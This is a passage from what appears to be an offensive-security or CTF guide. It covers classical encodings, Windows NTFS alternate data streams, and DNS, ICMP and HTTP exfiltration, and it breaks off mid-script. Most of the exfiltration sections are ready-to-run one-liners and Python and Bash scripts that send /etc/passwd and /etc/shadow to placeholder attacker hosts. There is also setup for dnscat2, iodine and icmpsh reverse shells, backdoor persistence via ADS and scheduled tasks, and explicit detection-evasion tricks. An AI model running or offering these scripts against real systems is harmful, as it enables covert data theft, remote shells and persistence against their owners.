echo "secret" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Python ROT13
python3 -c "import codecs; print(codecs.encode('secret', 'rot_13'))"
```

**Caesar Cipher** (Python):

```python
def caesar_cipher(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            offset = 65 if char.isupper() else 97
            result += chr((ord(char) - offset + shift) % 26 + offset)
        else:
            result += char
    return result

# Encode with shift 3
encoded = caesar_cipher("secret", 3)  # vhfuhw

# Decode (shift -3)
decoded = caesar_cipher(encoded, -3)  # secret

# Brute force all shifts
for shift in range(26):
    print(f"Shift {shift}: {caesar_cipher('vhfuhw', shift)}")
```

### XOR Encoding

**Python XOR Operations**:

```python
# XOR with single byte key
def xor_single_byte(data, key):
    return bytes([b ^ key for b in data])

data = b"secret"
key = 0x42
encoded = xor_single_byte(data, key)
decoded = xor_single_byte(encoded, key)  # XOR is symmetric

# XOR with multi-byte key
def xor_repeating_key(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

data = b"secret_message"
key = b"KEY"
encoded = xor_repeating_key(data, key)
decoded = xor_repeating_key(encoded, key)

# Brute force single-byte XOR
def brute_xor(data):
    for key in range(256):
        decoded = xor_single_byte(data, key)
        try:
            text = decoded.decode('ascii')
            if text.isprintable():
                print(f"Key {key:02x}: {text}")
        except:
            pass
```

**XOR Analysis Tools**:

```bash
# xortool - Automated XOR analysis
xortool -l 4 encrypted_file  # Assume key length 4
xortool -c 20 encrypted_file  # Most common character is space (0x20)

# Find key length
xortool -b encrypted_file
```

### Multi-Layer Encoding Detection

**CyberChef Magic Module**:

- Automatically detects and decodes multiple encoding layers
- Useful for CTF challenges with Base64 â†’ Hex â†’ ROT13 chains

**Manual Detection Strategy**:

1. **Character set analysis**: Identify encoding alphabet
    - Base64: `A-Za-z0-9+/=`
    - Hex: `0-9A-Fa-f`
    - Binary: `01`
2. **Length patterns**: Base64 padding (`=`), hex even length
3. **Entropy analysis**: High entropy suggests encryption/compression
4. **Recursive decoding**: Attempt decoding until plaintext emerges

```bash
# Example multi-layer decode
echo "NTZiNjI2MTczNjUzNjMzNmY2NDY1NjQ=" | base64 -d | xxd -r -p
# Base64 â†’ Hex ASCII â†’ Text
```

## Alternative Data Streams (ADS)

Alternative Data Streams (ADS) are a Windows NTFS feature allowing multiple data streams within a single file. ADS can hide data invisibly from standard directory listings.

### Understanding ADS

- Primary data stream: Default unnamed stream containing file content
- Alternate data streams: Named streams appended to files with `:` separator
- Format: `filename.ext:streamname:$DATA`

**Example**: `document.txt:hidden:$DATA` contains hidden data within `document.txt`

### Creating Alternative Data Streams (Windows)

**Command Prompt**:

```cmd
REM Create file with ADS
echo "This is visible data" > document.txt
echo "This is hidden data" > document.txt:hidden.txt

REM Create executable ADS
type C:\Windows\System32\calc.exe > document.txt:calc.exe

REM Create text ADS
echo "secret_password: admin123" > normal.txt:passwords.txt
```

**PowerShell**:

```powershell
# Create ADS
Set-Content -Path "document.txt" -Stream "hidden" -Value "secret data"

# Add to existing file
Add-Content -Path "document.txt" -Stream "credentials" -Value "user:password"

# Create binary ADS
$bytes = [System.IO.File]::ReadAllBytes("C:\Windows\System32\calc.exe")
[System.IO.File]::WriteAllBytes("document.txt:calc.exe", $bytes)
```

### Reading Alternative Data Streams

**Command Prompt**:

```cmd
REM Read ADS content
more < document.txt:hidden.txt
type document.txt:hidden.txt

REM Copy ADS to separate file
more < document.txt:hidden.txt > extracted_hidden.txt
```

**PowerShell**:

```powershell
# Read ADS
Get-Content -Path "document.txt" -Stream "hidden"

# List all streams
Get-Item "document.txt" -Stream *

# Read specific stream
Get-Content -Path "document.txt" -Stream "passwords.txt"

# Extract binary ADS
$bytes = Get-Content -Path "document.txt" -Stream "calc.exe" -Encoding Byte
[System.IO.File]::WriteAllBytes("C:\Temp\extracted_calc.exe", $bytes)
```

### Detecting Alternative Data Streams

**Windows Command-Line**:

```cmd
REM DIR does not show ADS by default
dir /R  # Display alternate streams

REM Example output:
REM 10/26/2025  12:00 PM    100 document.txt
REM                          50 document.txt:hidden.txt:$DATA
```

**PowerShell Detection**:

```powershell
# List all files with ADS
Get-ChildItem -Recurse | ForEach-Object { Get-Item $_.FullName -Stream * } | Where-Object Stream -ne ':$DATA'

# Comprehensive scan
Get-ChildItem -Path C:\Users\ -Recurse | Get-Item -Stream * | Where-Object {$_.Stream -ne ':$DATA'}

# Show file size including ADS
Get-Item "document.txt" | Select-Object Name, Length, @{Name="TotalSize";Expression={(Get-Item $_.FullName -Stream *).Length | Measure-Object -Sum).Sum}}
```

**Streams Utility (Sysinternals)**:

```cmd
REM Download from: https://learn.microsoft.com/en-us/sysinternals/downloads/streams

REM List streams
streams.exe document.txt

REM Scan directory recursively
streams.exe -s C:\Users\

REM Delete all ADS
streams.exe -d document.txt
```

### Executing Code from ADS

**Direct Execution** [Unverified: May be restricted by modern Windows security features]:

```cmd
REM Execute ADS directly (older Windows versions)
start document.txt:calc.exe

REM Using wmic
wmic process call create "document.txt:malware.exe"

REM Using forfiles
forfiles /p C:\Temp /m document.txt /c "cmd /c start .\@file:calc.exe"
```

**PowerShell Execution**:

```powershell
# Execute PowerShell script from ADS
Get-Content -Path "document.txt" -Stream "script.ps1" | Invoke-Expression

# Load .NET assembly from ADS
$bytes = Get-Content -Path "document.txt" -Stream "payload.dll" -Encoding Byte
[System.Reflection.Assembly]::Load($bytes)
```

### ADS in CTF Scenarios

**Common CTF Patterns**:

1. **Hidden flags**: `flag.txt:flag:$DATA` containing CTF flag
2. **Encoded data**: ADS containing Base64/hex encoded payloads
3. **Multi-stage**: ADS containing keys to decrypt primary file
4. **Forensics**: Deleted ADS remnants in file system artifacts

**Extraction Strategy**:

```powershell
# Comprehensive ADS extraction script
$files = Get-ChildItem -Recurse
foreach ($file in $files) {
    $streams = Get-Item $file.FullName -Stream * -ErrorAction SilentlyContinue
    foreach ($stream in $streams) {
        if ($stream.Stream -ne ':$DATA') {
            $output = "$($file.Name)_$($stream.Stream).extracted"
            Get-Content -Path $file.FullName -Stream $stream.Stream | Out-File $output
            Write-Host "Extracted: $output"
        }
    }
}
```

### ADS on Linux (Limited Support)

Linux does not natively support NTFS ADS, but can access when mounting NTFS volumes:

```bash
# Mount NTFS with stream support
sudo mount -t ntfs-3g /dev/sdb1 /mnt/windows

# List ADS using getfattr (extended attributes)
getfattr -d /mnt/windows/document.txt

# Read ADS
cat "/mnt/windows/document.txt:hidden.txt"

# Extract ADS using streams utility (if available)
wine streams.exe -s /mnt/windows/
```

### ADS Security Implications

**Persistence via ADS**:

```cmd
REM Hide backdoor in ADS
type backdoor.exe > document.txt:backdoor.exe

REM Execute via scheduled task
schtasks /create /tn "HiddenTask" /tr "document.txt:backdoor.exe" /sc onlogon /ru SYSTEM
```

**Data Exfiltration via ADS**:

```powershell
# Hide stolen data
Get-Content C:\sensitive\data.txt | Set-Content -Path "normal.txt" -Stream "exfil"

# Later extraction
Get-Content -Path "normal.txt" -Stream "exfil" | Out-File exfiltrated.txt
```

**Anti-Forensics**:

- ADS not visible in standard file listings
- Not included in file size calculations
- Often missed by basic forensic tools
- Can survive file copies (NTFS to NTFS only)

### Removing Alternative Data Streams

```cmd
REM Delete specific stream (PowerShell)
Remove-Item -Path "document.txt" -Stream "hidden"

REM Delete all streams (Sysinternals Streams)
streams.exe -d document.txt

REM Copy file without ADS (loses streams)
copy document.txt document_clean.txt /B
```

**Bulk ADS Removal**:

```powershell
# Remove all ADS from directory
Get-ChildItem -Recurse | ForEach-Object {
    $streams = Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue
    foreach ($stream in $streams) {
        if ($stream.Stream -ne ':$DATA') {
            Remove-Item -Path $_.FullName -Stream $stream.Stream
        }
    }
}
```

---

## Integrated Steganography & Exfiltration Workflow

### Discovery Phase

1. **File identification**: `file`, `binwalk`, `exiftool`
2. **Archive analysis**: Check encryption, extract hashes
3. **Encoding detection**: Analyze character sets, patterns
4. **ADS scanning**: `dir /R`, `Get-Item -Stream *`

### Extraction Phase

1. **Brute force passwords**: John, hashcat, fcrackzip
2. **Layer decoding**: Base64 â†’ Hex â†’ Binary chains
3. **Stream extraction**: Export all ADS content
4. **Carving**: Foremost, binwalk for embedded files

### Analysis Phase

1. **String extraction**: Search for credentials, keys, flags
2. **XOR analysis**: Detect repeating-key encryption
3. **Entropy analysis**: Identify encrypted/compressed sections
4. **Pattern matching**: Regex for flags, passwords, encoded data

---

## DNS Exfiltration

DNS exfiltration exploits DNS queries to transmit data, often bypassing firewalls since DNS traffic (port 53) is typically allowed for name resolution.

### DNS Exfiltration Fundamentals

**DNS Query Structure**

```
# Standard DNS query format
subdomain.domain.com

# Exfiltration encoding
<encoded_data>.<identifier>.<attacker_domain>.com

# Example
dGVzdGRhdGE.chunk1.exfil.attacker.com
```

**[Inference]** DNS has query size limitations:

- Maximum label length: 63 characters
- Maximum domain name length: 253 characters
- Data must be encoded (base64, hex) and chunked

### Manual DNS Exfiltration

**Basic Data Encoding and Transmission**

```bash
# Encode data to base64
echo "sensitive data" | base64
# Output: c2Vuc2l0aXZlIGRhdGEK

# Remove newlines and padding
echo "sensitive data" | base64 | tr -d '\n=' | tr '+/' '-_'

# Send as DNS query
dig c2Vuc2l0aXZlIGRhdGEK.exfil.attacker.com

# Using nslookup
nslookup c2Vuc2l0aXZlIGRhdGEK.exfil.attacker.com

# Using host
host c2Vuc2l0aXZlIGRhdGEK.exfil.attacker.com
```

**Chunking Large Data**

```bash
# Read file and encode
data=$(cat /etc/passwd | base64 | tr -d '\n=')

# Split into 63-character chunks
echo "$data" | fold -w 63 | nl -v 0 | while read num chunk; do
    dig ${chunk}.${num}.exfil.attacker.com
    sleep 1
done

# Alternative with xxd (hex encoding)
xxd -p /etc/passwd | tr -d '\n' | fold -w 60 | nl -v 0 | while read num chunk; do
    dig ${chunk}.${num}.exfil.attacker.com
done
```

**One-Liner Exfiltration Scripts**

```bash
# Exfiltrate /etc/passwd
cat /etc/passwd | base64 | tr -d '\n=' | fold -w 50 | while read line; do dig ${line}.exfil.attacker.com; done

# Exfiltrate with sequence numbers
n=0; cat /etc/shadow | base64 | tr -d '\n=' | fold -w 50 | while read line; do dig ${line}.$((n++)).exfil.attacker.com; done

# Compress before exfiltration
gzip -c /etc/passwd | base64 | tr -d '\n=' | fold -w 50 | while read line; do dig ${line}.exfil.attacker.com; done
```

### Automated DNS Exfiltration Tools

**dnscat2**

**Server Setup (Attacker Machine)**

```bash
# Install dnscat2 server (Ruby)
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server
gem install bundler
bundle install

# Start server
ruby dnscat2.rb exfil.attacker.com

# Start server with specific domain
ruby dnscat2.rb --dns domain=exfil.attacker.com

# Start without requiring DNS server (direct connection)
ruby dnscat2.rb --dns port=53531,domain=exfil.attacker.com --no-cache

# With pre-shared secret
ruby dnscat2.rb --secret=mysecret exfil.attacker.com
```

**Client Setup (Compromised Machine)**

```bash
# Download or compile client
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Connect to server
./dnscat --dns server=attacker_ip,port=53 exfil.attacker.com

# Connect with pre-shared secret
./dnscat --secret=mysecret exfil.attacker.com

# Specify DNS server
./dnscat --dns server=8.8.8.8,domain=exfil.attacker.com

# Create encrypted tunnel
./dnscat --secret=mysecret --dns server=attacker_ip exfil.attacker.com
```

**dnscat2 Session Commands**

```bash
# Server-side commands after connection
sessions        # List active sessions
session -i 1    # Interact with session 1
shell           # Get shell on target
download /etc/passwd
upload /tmp/tool
listen 127.0.0.1:8080 0.0.0.0:80  # Port forwarding
ping
kill
```

**iodine (DNS Tunneling)**

**Server Setup**

```bash
# Install iodine
apt install iodine

# Start iodine server
iodined -f -c -P password 10.0.0.1 exfil.attacker.com

# Parameters:
# -f: Run in foreground
# -c: Disable client IP checking
# -P: Set password
# 10.0.0.1: Tunnel IP network
# -p: Port (default 53)

# With custom port
iodined -f -c -P password -p 5353 10.0.0.1 exfil.attacker.com
```

**Client Setup**

```bash
# Connect to iodine server
iodine -f -P password exfil.attacker.com

# Specify DNS server
iodine -f -P password 1.2.3.4 exfil.attacker.com

# Use tunnel
ssh user@10.0.0.1
curl --interface dns0 http://attacker.com
```

**dns2tcp**

**Server Setup**

```bash
# Install dns2tcp
apt install dns2tcp

# Create configuration file
cat > /etc/dns2tcpd.conf << 'EOF'
listen = 0.0.0.0
port = 53
user = nobody
chroot = /tmp
domain = exfil.attacker.com
resources = ssh:127.0.0.1:22,http:127.0.0.1:80
EOF

# Start server
dns2tcpd -f /etc/dns2tcpd.conf -F
```

**Client Setup**

```bash
# Connect client
dns2tcpc -r ssh -z exfil.attacker.com attacker_ip

# Create SOCKS proxy
dns2tcpc -r http -l 8080 -z exfil.attacker.com attacker_ip

# Use with SSH
ssh -o ProxyCommand="dns2tcpc -r ssh -z exfil.attacker.com attacker_ip" user@localhost
```

### Custom DNS Exfiltration Scripts

**Python DNS Exfiltration Script**

```python
#!/usr/bin/env python3
import dns.resolver
import base64
import sys

def exfiltrate_file(filename, domain):
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Encode and chunk
    encoded = base64.b64encode(data).decode().replace('=', '').replace('+', '-').replace('/', '_')
    chunk_size = 50
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    # Send chunks
    for i, chunk in enumerate(chunks):
        query = f"{chunk}.{i}.{domain}"
        try:
            dns.resolver.resolve(query, 'A')
        except:
            pass
        print(f"Sent chunk {i+1}/{len(chunks)}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <file> <domain>")
        sys.exit(1)
    
    exfiltrate_file(sys.argv[1], sys.argv[2])
```

**Bash DNS Exfiltration with Error Handling**

```bash
#!/bin/bash
# dns_exfil.sh

FILE="$1"
DOMAIN="$2"
CHUNK_SIZE=50

if [ -z "$FILE" ] || [ -z "$DOMAIN" ]; then
    echo "Usage: $0 <file> <domain>"
    exit 1
fi

# Encode file
encoded=$(cat "$FILE" | gzip | base64 | tr -d '\n=' | tr '+/' '-_')

# Calculate chunks
length=${#encoded}
chunks=$((length / CHUNK_SIZE + 1))

echo "Exfiltrating $FILE ($length bytes, $chunks chunks)"

# Send chunks
for ((i=0; i<chunks; i++)); do
    chunk=${encoded:i*CHUNK_SIZE:CHUNK_SIZE}
    query="${chunk}.${i}.${DOMAIN}"
    
    # Try multiple DNS resolution methods
    dig +short "$query" @8.8.8.8 2>/dev/null || \
    nslookup "$query" 8.8.8.8 2>/dev/null || \
    host "$query" 8.8.8.8 2>/dev/null
    
    echo "Sent chunk $((i+1))/$chunks"
    sleep 0.5
done

echo "Exfiltration complete"
```

### DNS Exfiltration Reception (Attacker Side)

**Setting Up DNS Server to Capture Queries**

**Using tcpdump**

```bash
# Capture DNS queries on attacker machine
tcpdump -i eth0 -n port 53 -A

# Save to file
tcpdump -i eth0 -n port 53 -w dns_capture.pcap

# Filter for specific domain
tcpdump -i eth0 -n port 53 and host attacker.com
```

**Using Wireshark**

```bash
# Capture filter
port 53

# Display filter for queries
dns.qry.name contains "exfil"
```

**Python DNS Server to Log Queries**

```python
#!/usr/bin/env python3
from scapy.all import *
import base64

def dns_handler(pkt):
    if pkt.haslayer(DNSQR):
        query = pkt[DNSQR].qname.decode()
        if 'exfil.attacker.com' in query:
            # Extract data from subdomain
            subdomain = query.split('.')[0]
            print(f"Received: {subdomain}")
            
            # Try to decode
            try:
                decoded = base64.b64decode(subdomain + '==')
                print(f"Decoded: {decoded}")
            except:
                pass

print("DNS Exfiltration Listener Started")
sniff(filter="udp port 53", prn=dns_handler, store=0)
```

**Using dnsmasq**

```bash
# Install dnsmasq
apt install dnsmasq

# Configure to log all queries
echo "log-queries" >> /etc/dnsmasq.conf

# Restart dnsmasq
systemctl restart dnsmasq

# Monitor logs
tail -f /var/log/dnsmasq.log | grep exfil
```

### DNS Exfiltration Detection Evasion

**Timing Randomization**

```bash
# Random delays between queries
cat data.txt | base64 | tr -d '\n' | fold -w 50 | while read line; do
    dig ${line}.exfil.attacker.com
    sleep $(( $RANDOM % 10 + 1 ))
done
```

**Using Legitimate DNS Servers**

```bash
# Query through Google DNS
dig @8.8.8.8 data.exfil.attacker.com

# Query through Cloudflare DNS
dig @1.1.1.1 data.exfil.attacker.com

# Rotate DNS servers
servers=("8.8.8.8" "1.1.1.1" "9.9.9.9")
for chunk in chunks; do
    server=${servers[$RANDOM % ${#servers[@]}]}
    dig @$server ${chunk}.exfil.attacker.com
done
```

**Encoding Variations**

```bash
# Hex encoding
echo "data" | xxd -p | tr -d '\n'

# Custom base32
echo "data" | base32 | tr -d '\n='

# URL encoding
echo "data" | xxd -p | sed 's/../%&/g'
```

## ICMP Exfiltration

ICMP exfiltration embeds data within ICMP echo request/reply packets (ping), which are often allowed through firewalls for network diagnostics.

### ICMP Exfiltration Fundamentals

**ICMP Packet Structure**

```
ICMP Echo Request/Reply contains:
- Type (8 for request, 0 for reply)
- Code (typically 0)
- Checksum
- Identifier
- Sequence number
- Data payload (can contain arbitrary data)
```

**[Inference]** ICMP data payload typically supports up to 65,507 bytes theoretically, but practical limits are often much smaller (1472 bytes for standard MTU).

### Manual ICMP Exfiltration

**Using ping with Data**

```bash
# Linux: Send ICMP with custom pattern
ping -c 1 -p $(echo -n "secret data" | xxd -p) attacker_ip

# Parameters:
# -c: Count (number of packets)
# -p: Pattern (hex format)

# Example: Exfiltrate /etc/passwd line by line
cat /etc/passwd | while read line; do
    hex_data=$(echo -n "$line" | xxd -p | head -c 32)
    ping -c 1 -p $hex_data attacker_ip
    sleep 1
done

# Send specific data pattern
ping -c 1 -p "deadbeef" attacker_ip
```

**Using hping3 (Advanced ICMP Crafting)**

```bash
# Install hping3
apt install hping3

# Send ICMP with custom data
hping3 -1 -c 1 -d 100 --icmp-ts attacker_ip

# Parameters:
# -1: ICMP mode
# -c: Count
# -d: Data size
# --icmp-ts: ICMP timestamp

# Send ICMP with specific payload
echo "secret data" > /tmp/payload.txt
hping3 -1 -c 1 --file /tmp/payload.txt attacker_ip

# Multiple packets with data
hping3 -1 -c 10 -d 1000 --faster attacker_ip

# ICMP with custom type/code
hping3 -1 -c 1 --icmp-type 8 --icmp-code 0 attacker_ip
```

### Automated ICMP Exfiltration Tools

**ptunnel (ICMP Tunneling)**

**Server Setup (Attacker Machine)**

```bash
# Install ptunnel
apt install ptunnel-ng

# Start ptunnel server
ptunnel-ng -x password

# Verbose mode
ptunnel-ng -x password -v 4

# Specify interface
ptunnel-ng -x password -c eth0
```

**Client Setup (Compromised Machine)**

```bash
# Create tunnel
ptunnel-ng -p attacker_ip -x password -lp 8000 -da localhost -dp 22

# Parameters:
# -p: Proxy (attacker IP)
# -x: Password
# -lp: Local port
# -da: Destination address
# -dp: Destination port

# Connect through tunnel
ssh -p 8000 user@localhost

# Alternative: HTTP over ICMP
ptunnel-ng -p attacker_ip -x password -lp 8080 -da target_web_server -dp 80
curl http://localhost:8080
```

**icmpsh (ICMP Reverse Shell)**

**Server Setup (Attacker Machine)**

```bash
# Download icmpsh
git clone https://github.com/bdamele/icmpsh.git
cd icmpsh

# Disable ICMP replies (important to avoid interference)
sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Run server (Python)
python icmpsh_m.py attacker_ip target_ip

# Alternative: Run with root
sudo python icmpsh_m.py attacker_ip target_ip
```

**Client Setup (Compromised Machine)**

```bash
# Windows client
icmpsh.exe -t attacker_ip

# Linux client (compile from source)
gcc icmpsh-s.c -o icmpsh-s
./icmpsh-s -t attacker_ip

# Using PowerShell (Windows)
powershell.exe -ExecutionPolicy Bypass -File icmpsh.ps1 -t attacker_ip
```

**Custom ICMP Exfiltration with Scapy**

**Python ICMP Sender Script**

```python
#!/usr/bin/env python3
from scapy.all import *
import sys
import time

def exfiltrate_icmp(filename, target_ip):
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Chunk data into ICMP-sized pieces
    chunk_size = 1400  # Safe size for most networks
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    print(f"Exfiltrating {len(data)} bytes in {len(chunks)} chunks")
    
    for seq, chunk in enumerate(chunks):
        # Create ICMP packet
        packet = IP(dst=target_ip)/ICMP(type=8, seq=seq)/Raw(load=chunk)
        send(packet, verbose=False)
        print(f"Sent chunk {seq+1}/{len(chunks)}")
        time.sleep(0.5)
    
    print("Exfiltration complete")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <file> <target_ip>")
        sys.exit(1)
    
    exfiltrate_icmp(sys.argv[1], sys.argv[2])
```

**Python ICMP Receiver Script**

```python
#!/usr/bin/env python3
from scapy.all import *
import sys

data_chunks = {}

def icmp_handler(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # Echo request
        if pkt.haslayer(Raw):
            seq = pkt[ICMP].seq
            payload = bytes(pkt[Raw].load)
            data_chunks[seq] = payload
            print(f"Received chunk {seq}: {len(payload)} bytes")

def save_data(output_file):
    print(f"\nReassembling {len(data_chunks)} chunks...")
    sorted_chunks = [data_chunks[i] for i in sorted(data_chunks.keys())]
    complete_data = b''.join(sorted_chunks)
    
    with open(output_file, 'wb') as f:
        f.write(complete_data)
    
    print(f"Saved {len(complete_data)} bytes to {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <output_file>")
        sys.exit(1)
    
    output_file = sys.argv[1]
    
    print("ICMP Exfiltration Receiver Started")
    print("Press Ctrl+C to stop and save data")
    
    try:
        sniff(filter="icmp", prn=icmp_handler, store=0)
    except KeyboardInterrupt:
        save_data(output_file)
```

### ICMP Exfiltration Using Native Tools

**Bash Script with ping**

```bash
#!/bin/bash
# icmp_exfil.sh

FILE="$1"
TARGET="$2"
CHUNK_SIZE=16  # Hex characters (8 bytes)

if [ -z "$FILE" ] || [ -z "$TARGET" ]; then
    echo "Usage: $0 <file> <target_ip>"
    exit 1
fi

# Convert file to hex
hex_data=$(xxd -p "$FILE" | tr -d '\n')
length=${#hex_data}
chunks=$((length / CHUNK_SIZE + 1))

echo "Exfiltrating $FILE via ICMP ($chunks chunks)"

for ((i=0; i<chunks; i++)); do
    chunk=${hex_data:i*CHUNK_SIZE:CHUNK_SIZE}
    
    # Pad if needed
    while [ ${#chunk} -lt $CHUNK_SIZE ]; do
        chunk="${chunk}0"
    done
    
    # Send via ping
    ping -c 1 -p "$chunk" "$TARGET" > /dev/null 2>&1
    echo "Sent chunk $((i+1))/$chunks"
    sleep 0.5
done

echo "Exfiltration complete"
```

### ICMP Exfiltration Reception (Attacker Side)

**Using tcpdump**

```bash
# Capture ICMP packets
tcpdump -i eth0 icmp -n -X

# Save to pcap
tcpdump -i eth0 icmp -w icmp_capture.pcap

# Filter for echo requests only
tcpdump -i eth0 'icmp[icmptype] == 8' -n -X

# Extract ICMP data payload
tcpdump -i eth0 icmp -n -X | grep "0x0000"
```

**Using Wireshark**

```bash
# Capture filter
icmp

# Display filter for echo requests
icmp.type == 8

# Extract data
icmp.data
```

**Using tshark**

```bash
# Capture and display ICMP data
tshark -i eth0 -f "icmp" -Y "icmp.type==8" -T fields -e icmp.data

# Save to file
tshark -i eth0 -f "icmp" -Y "icmp.type==8" -T fields -e icmp.data > icmp_data.txt

# Decode hex data
tshark -i eth0 -f "icmp" -Y "icmp.type==8" -T fields -e icmp.data | xxd -r -p > exfiltrated_file
```

**Scapy ICMP Sniffer**

```python
#!/usr/bin/env python3
from scapy.all import *

def process_icmp(pkt):
    if pkt.haslayer(ICMP) and pkt.haslayer(Raw):
        data = pkt[Raw].load
        print(f"ICMP Data: {data.hex()}")
        
        # Try to decode as text
        try:
            print(f"ASCII: {data.decode('ascii')}")
        except:
            pass

sniff(filter="icmp", prn=process_icmp, store=0)
```

### ICMP Exfiltration Detection Evasion

**Fragmentation**

```bash
# Send fragmented ICMP packets
hping3 -1 -c 1 -d 3000 -f attacker_ip

# Parameters:
# -f: Fragment packets
```

**ICMP Type/Code Variation**

```python
# Use different ICMP types
from scapy.all import *

# Echo request (type 8)
send(IP(dst="target")/ICMP(type=8)/Raw(load=data))

# Timestamp request (type 13)
send(IP(dst="target")/ICMP(type=13)/Raw(load=data))

# Address mask request (type 17)
send(IP(dst="target")/ICMP(type=17)/Raw(load=data))
```

**Rate Limiting**

```bash
# Slow exfiltration to avoid detection
for chunk in chunks; do
    ping -c 1 -p "$chunk" target_ip
    sleep $(( $RANDOM % 30 + 10 ))  # Random 10-40 second delay
done
```

## HTTP/HTTPS Exfiltration

HTTP/HTTPS exfiltration leverages web traffic, which is ubiquitous and often the least restricted protocol in network environments.

### HTTP GET Request Exfiltration

**Using cURL**

```bash
# Basic GET request with data in URL
curl "http://attacker.com/exfil?data=$(cat /etc/passwd | base64)"

# URL encode data
data=$(cat /etc/passwd | base64 | jq -sRr @uri)
curl "http://attacker.com/exfil?data=$data"

# Custom headers
curl -H "X-Data: $(cat /etc/passwd | base64)" http://attacker.com/

# User-Agent field
curl -A "$(cat /etc/passwd | base64)" http://attacker.com/

# Cookie field
curl -b "data=$(cat /etc/passwd | base64)" http://attacker.com/

# Referer field
curl -e "http://attacker.com/$(cat /etc/passwd | base64)" http://attacker.com/
```

**Chunking Large Data via GET**

```bash
# Split and send in multiple requests
cat /etc/passwd | base64 | fold -w 1000 | nl -v 0 | while read num chunk; do
    curl "http://attacker.com/exfil?chunk=$num&data=$chunk"
    sleep 1
done
```

**Using wget**

```bash
# Basic GET exfiltration
wget "http://attacker.com/?data=$(cat /etc/passwd | base64)" -O /dev/null

# Custom headers
wget --header="X-Data: $(cat /etc/passwd | base64)" http://attacker.com/ -O /dev/null

# User-Agent
wget --user-agent="$(cat /etc/passwd | base64)" http://attacker.com/ -O /dev/null

# Quiet mode (no output)
wget -q "http://attacker.com/?data=$data" -O /dev/null
```

### HTTP POST Request Exfiltration

**Using cURL POST**

```bash
# POST data as form data
curl -X POST -d "data=$(cat /etc/passwd | base64)" http://attacker.com/exfil

# POST data from file
curl -X POST --data-binary @/etc/passwd http://attacker.com/exfil

# POST as JSON
curl -X POST -H "Content-Type: application/json" \
    -d "{\"data\":\"$(cat /etc/passwd | base64)\"}" \
    http://attacker.com/exfil

# POST multipart form (file upload)
curl -X POST -F "file=@/etc/passwd" http://attacker.com/upload

# Multiple files
curl -X POST -F "file1=@/etc/passwd" -F "file2=@/etc/shadow" http://attacker.com/upload
```

**POST with Custom Headers**

```bash
# Authorization header
curl -X POST -H "Authorization: Bearer $(cat /etc/passwd | base64)" \
    http://attacker.com/exfil

# Custom header
curl -X POST -H "X-Exfil-Data: $(cat /etc/passwd | base64)" \
    http://attacker.com/exfil
```

### HTTPS Exfiltration (Encrypted)

**Basic HTTPS**

```bash
# HTTPS GET
curl "https://attacker.com/exfil?data=$(cat /etc/passwd | base64)"

# HTTPS POST
curl -X POST --data-binary @/etc/passwd https://attacker.com/exfil

# Ignore certificate validation (self-signed certs)
curl -k "https://attacker.com/exfil?data=$data"

# HTTPS with client certificate
curl --cert client.crt --key client.key https://attacker.com/exfil
```

**[Inference]** HTTPS provides encryption, making detection more difficult as packet inspection cannot view payload contents without SSL/TLS interception.

### HTTP Exfiltration via Cloud Services

**Pastebin-like Services**

```bash
# Pastebin
curl -X POST -d "api_dev_key=YOUR_API_KEY" \
    -d "api_option=paste" \
    -d "api_paste_code=$(cat /etc/passwd)" \
    https://pastebin.com/api/api_post.php

# GitHub Gist
curl -X POST -H "Authorization: token YOUR_TOKEN" \
    -d "{\"files\":{\"data.txt\":{\"content\":\"$(cat /etc/passwd)\"}}}" \
    https://api.github.com/gists

# Hastebin
curl -X POST -d "$(cat /etc/passwd)" https://hastebin.com/documents
```

**Cloud Storage Services**

**AWS S3**

```bash
# Upload to S3 bucket (requires AWS CLI)
aws s3 cp /etc/passwd s3://exfil-bucket/passwd.txt

# Using curl with pre-signed URL
curl -X PUT --upload-file /etc/passwd "https://bucket.s3.amazonaws.com/file?presigned_url_params"
```

**Dropbox**

```bash
# Upload via Dropbox API
curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer YOUR_TOKEN" \
    --header "Content-Type: application/octet-stream" \
    --header "Dropbox-API-Arg: {\"path\":\"/exfil/passwd.txt\"}" \
    --data-binary @/etc/passwd
```

**Google Drive**

```bash
# Upload via Drive API (requires OAuth token)
curl -X POST \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -F "metadata={name:'passwd.txt'};type=application/json;charset=UTF-8" \
    -F "file=@/etc/passwd;type=text/plain" \
    "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart"
```

### Automated HTTP Exfiltration Tools

**PyExfil**

```bash
# Install PyExfil
git clone https://github.com/ytisf/PyExfil.git
cd PyExfil
pip install -r requirements.txt

# HTTP Cookie exfiltration
python -m pyexfil.network.HTTP_Cookies.http_exfiltration \
    --server http://attacker.com \
    --file /etc/passwd

# HTTPS exfiltration
python -m pyexfil.network.HTTPS.https_exfiltration \
    --server https://attacker.com \
    --file /etc/passwd
```

**Custom Python HTTP Exfiltration**

**Client Script**

```python
#!/usr/bin/env python3
import requests
import base64
import sys
import os

def exfiltrate_http(filename, url, method='POST'):
    """Exfiltrate file via HTTP"""
    
    # Read file
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Encode data
    encoded = base64.b64encode(data).decode()
    
    print(f"Exfiltrating {filename} ({len(data)} bytes)")
    
    try:
        if method.upper() == 'POST':
            # POST method
            response = requests.post(
                url,
                data={'data': encoded, 'filename': os.path.basename(filename)},
                timeout=30
            )
        else:
            # GET method (chunked for URL length limits)
            chunk_size = 1000
            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            
            for i, chunk in enumerate(chunks):
